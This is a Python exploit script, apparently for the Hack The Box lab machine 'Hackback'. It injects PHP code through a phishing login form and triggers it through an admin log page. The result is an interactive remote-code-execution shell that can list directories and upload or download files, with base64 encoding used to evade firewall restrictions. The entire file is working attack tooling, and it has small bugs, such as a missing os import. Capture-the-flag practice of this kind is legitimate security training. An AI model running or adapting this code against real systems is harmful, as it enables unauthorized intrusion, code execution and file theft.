#!/bin/python3
import requests
import netifaces, hashlib
from cmd import Cmd
import sys
import re
from base64 import b64encode, b64decode

'''TODO
1) Pull ip form ifconfig tun0
2) create help documentation for dir, upload, download

'''

#This function injects php code into the password parameter.
def Command(cmd):
	url = "http://www.hackthebox.htb"
	php_code = "<?php "+ cmd + ";?>";
	parameters = {'_token' : '23HZyAY4Y8Z9wq1ntgvP8Yd', 'username' : "ANYTHING", 'password' : php_code, 'submit' : '' }
	requests.post( url, data=parameters )

#This function pulls the credentials that have been phished, and therefore executes php code
def Output():
	url ="http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
	parameters = { "action": "show" , "site": "hackthebox" , "password":"12345678", "session" : session }
	res = requests.get(url, params = parameters, allow_redirects= False)
	return ((res.content).decode("utf-8"))

#This function resets and credentials that have been stored, and therefore resets
#any php code that has been injected
def Reset():
	url = "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
	parameters = { "action": "init" , "site": "hackthebox" , "password" :"12345678", "session": session }
	res = requests.get(url, params = parameters, allow_redirects= False)

#This function fixes when paths have bad chars
def fixPath(path):
	if "C:" in path:
		path = path.replace("C:", "")
	if "\\" in path:
		path = path.replace("\\", "/")
	return path

class Terminal(Cmd):
	i = "Hackback RCE script! \nUse help for commands"
	prompt = "HackBack_RCE:\> "

	def default(self, args):
		Reset()
		Command(args)
		print(Output())

#Function to allow dir: usage dir /
	def do_dir (self, args):
		args = fixPath(args)
		cmd = "print_r(scandir(\"{}\"))".format(args)
		Reset()
		Command(cmd)
		dirs = Output()
		m = re.search("\([\w\W]*\)", dirs)
		print("Directory Listing for {}\r\n".format(args))
#splits the directory listing into a list
		for i in m.group(0).splitlines():
			try:
				print(" "+i.split("=>")[1])
			except:
				pass
		print()

#This function uploads a local file to the remote system, include full path 
#of local file and full path of the download location
#We b64 the file to get around firewall restrictions
	def do_upload(self,args):
		local, remote = args.split(",")[0], args.split(",")[1]
		os.system("base64 {} > {}.b64".format(local, local))
		local = local + ".b64"
		content = open(local, "r").read()
		cmd = "file_put_contents(\"{}\",base64_decode(\"{}\"))".format(local,(b64encode(content.encode('utf-8')).decode("utf-8")))
		Reset()
		Command(cmd)
		Output()
		cmd = "file_put_contents(\"{}\",base64_decode(file_get_contents(\"{}\"))); echo 'uploaded'".format(fixPath(remote),local)
		Reset()
		os.system("rm {}".format(local))
		Command(cmd)
		if 'uploaded' in Output():
			print("Uploaded")
		else:
			print("Error uploading")
	
#This function downloads a remote file to the local system, include full path 
#of remote file and full path of the local download location
#We b64 the file to get around firewall restrictions	
	def do_download(self, args):
		remote, local = args.split(",")[0], args.split(",")[1]
		cmd = "echo '<file>' ;echo(base64_encode(file_get_contents(\"{}\"))); echo '<file>'".format(fixPath(remote))
		Reset()
		Command(cmd)
		b64File = re.search("<file>.*<file>", Output())
		content = b64File.group(0).replace("<file>", "")
		f = open(local, "wb+")
		f.write(b64decode(content.encode('utf-8')))
		print("Download complete")

	def do_exit(self, args):
		sys.exit(0)

#This function pulls the php session id
def main():
	ip = "10.10.14.16"
	#unicode-objects have to be encoded before hashing
	encoded_ip = ip.encode('utf-8')
	h = hashlib.new("sha256")
	h.update(encoded_ip)
	global session
	session = h.hexdigest()
	t = Terminal()
	t.cmdloop()

if __name__ == '__main__':
	main()

